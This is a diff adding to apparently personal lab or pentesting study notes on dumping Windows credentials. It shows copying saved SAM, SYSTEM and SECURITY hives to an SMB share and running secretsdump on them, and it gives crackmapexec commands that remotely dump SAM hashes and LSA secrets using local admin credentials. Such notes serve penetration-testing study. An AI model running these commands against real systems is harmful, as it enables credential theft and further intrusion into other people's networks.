@@ -22,3 +22,22 @@ We can create ftp, http or smb server to transfer these files to our linux machi
 
 **Transfering to smb share from windows:**
 `move sam.save \\IP\sharename` same for system.save and security.save
+
+## Dumping hashes from linxu using hives:
+
+We will use secretsdump from `/usr/share/doc/python3-impacket/examples`:
+```bash
+python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+```
+Fromat: `Dumping local SAM hashes (uid:rid:lmhash:nthash)`
+
+
+# Remote Dumping & LSA Secrets Considerations
+With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network
+```bash
+crackmapexec smb 10.129.42.198 --local-auth -u user -p password --lsa
+```
+## Dumping SAM Remotely
+```bash
+crackmapexec smb 10.129.42.198 --local-auth -u user -p password --sam
+```
